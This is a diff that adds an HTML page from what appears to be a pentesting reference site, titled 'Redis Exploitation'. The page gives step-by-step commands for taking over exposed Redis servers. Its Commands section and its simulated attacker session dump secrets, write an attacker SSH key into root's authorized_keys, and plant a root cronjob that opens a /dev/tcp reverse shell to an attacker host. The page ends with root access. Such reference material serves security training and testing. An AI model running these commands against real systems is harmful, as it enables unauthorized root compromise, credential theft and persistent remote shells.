@@ -1,0 +1,207 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">Redis Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>Databases</strong> • Focus: <strong>Redis Abuse & Unauthorized Access</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    Redis (TCP/6379) is a popular in-memory data store used for caching and session 
+    management. By default, Redis trusts local clients, often leaving it exposed 
+    without authentication. Attackers exploit Redis to read/write arbitrary keys, 
+    dump sensitive data, escalate privileges by writing SSH keys or cron jobs, 
+    and even achieve remote code execution (RCE). Misconfigured Redis instances 
+    are frequently abused in botnets and ransomware campaigns.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>No Authentication:</strong> Older Redis versions default to trust clients.</li>
+    <li><strong>Root Privileges:</strong> Many Redis servers run as root.</li>
+    <li><strong>Persistence Abuse:</strong> Attackers can write arbitrary files with <code>SAVE</code>.</li>
+    <li><strong>Data Exfiltration:</strong> API keys, session tokens, and passwords often stored in Redis.</li>
+    <li><strong>Botnet Exploitation:</strong> Redis is commonly hijacked for cryptojacking.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>Discovery:</strong> Identify Redis service on TCP/6379.</li>
+    <li><strong>Authentication:</strong> Attempt direct access (AUTH bypass or weak password).</li>
+    <li><strong>Enumeration:</strong> List keys, dump DB, check config.</li>
+    <li><strong>Exploitation:</strong> Abuse <code>CONFIG SET</code> and <code>SAVE</code> to write files (e.g., SSH keys, cronjobs).</li>
+    <li><strong>Impact:</strong> Full system compromise, data theft, botnet persistence.</li>
+  </ol>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Scan for Redis on TCP/6379.</li>
+    <li>Check if AUTH required; brute force if enabled.</li>
+    <li>Enumerate keys with <code>KEYS *</code>.</li>
+    <li>Dump data and extract secrets.</li>
+    <li>Abuse persistence to gain RCE (SSH keys, cronjobs, webshells).</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Discovery
+# ------------------------------
+nmap -p6379 --script redis-info [target]
+
+# ------------------------------
+# Connect
+# ------------------------------
+redis-cli -h [target] -p 6379
+AUTH password123
+
+# ------------------------------
+# Enumeration
+# ------------------------------
+INFO
+KEYS *
+GET session:123
+CONFIG GET dir
+CONFIG GET dbfilename
+
+# ------------------------------
+# Dump Data
+# ------------------------------
+redis-cli -h [target] --scan
+redis-cli -h [target] --rdb dump.rdb
+
+# ------------------------------
+# Exploitation - Write SSH Key
+# ------------------------------
+(echo -e "\n\nssh-rsa AAAAB3... attacker@host\n\n") > /tmp/redis_pub.txt
+cat /tmp/redis_pub.txt | redis-cli -h [target] -x set crackit
+redis-cli -h [target] config set dir /root/.ssh/
+redis-cli -h [target] config set dbfilename "authorized_keys"
+redis-cli -h [target] save
+
+# ------------------------------
+# Exploitation - Cronjob RCE
+# ------------------------------
+redis-cli -h [target] set 1 "\n* * * * * /bin/bash -i >& /dev/tcp/attackerIP/4444 0>&1\n"
+redis-cli -h [target] config set dir /var/spool/cron/
+redis-cli -h [target] config set dbfilename "root"
+redis-cli -h [target] save
+
+# ------------------------------
+# Example Workflow
+# ------------------------------
+nmap -p6379 --script redis-info 192.168.1.70
+redis-cli -h 192.168.1.70
+KEYS *
+GET admin:token
+CONFIG SET dir /root/.ssh/
+CONFIG SET dbfilename authorized_keys
+SAVE
+ssh root@192.168.1.70 -i attacker_key
+  </pre>
+</section>
+
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ nmap -p6379 --script redis-info 192.168.1.70
+PORT     STATE SERVICE
+6379/tcp open  redis
+| redis-info:
+|   Version: 5.0.7
+|   Role: master
+|   Mode: standalone
+|   Connected clients: 2
+
+[ saide ~ ]$ redis-cli -h 192.168.1.70
+192.168.1.70:6379> KEYS *
+1) "admin:token"
+2) "session:123"
+
+192.168.1.70:6379> GET admin:token
+"SuperSecretJWT2025!"
+
+[+] Sensitive token dumped
+
+192.168.1.70:6379> CONFIG SET dir /root/.ssh/
+OK
+192.168.1.70:6379> CONFIG SET dbfilename "authorized_keys"
+OK
+192.168.1.70:6379> SAVE
+OK
+
+[ saide ~ ]$ ssh root@192.168.1.70 -i attacker_key
+root@victim:~# id
+uid=0(root) gid=0(root) groups=0(root)
+[+] RCE via Redis achieved
+    </pre>
+  </details>
+</section>
+
+<!-- Example Results -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to view sample Redis exploitation results
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+# Service Discovery
+6379/tcp open  redis 5.0.7
+
+# Dumped Keys
+admin:token = SuperSecretJWT2025!
+session:123 = eyJhbGciOi...
+
+# Exploitation
+SSH authorized_keys overwritten with attacker’s key
+
+# Proof of Exploitation
+SSH root access gained via injected key
+uid=0(root) gid=0(root)
+    </pre>
+  </details>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Pentesting Redis
+      </a>
+    </li>
+    <li>
+      <a href="https://attack.mitre.org/techniques/T1505/003/" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        MITRE ATT&CK – Server Software Component (Redis Abuse)
+      </a>
+    </li>
+    <li>Red Team workflow: Discover → Dump → Exfil secrets → Abuse persistence → RCE via SSH/cron.</li>
+  </ul>
+</section>
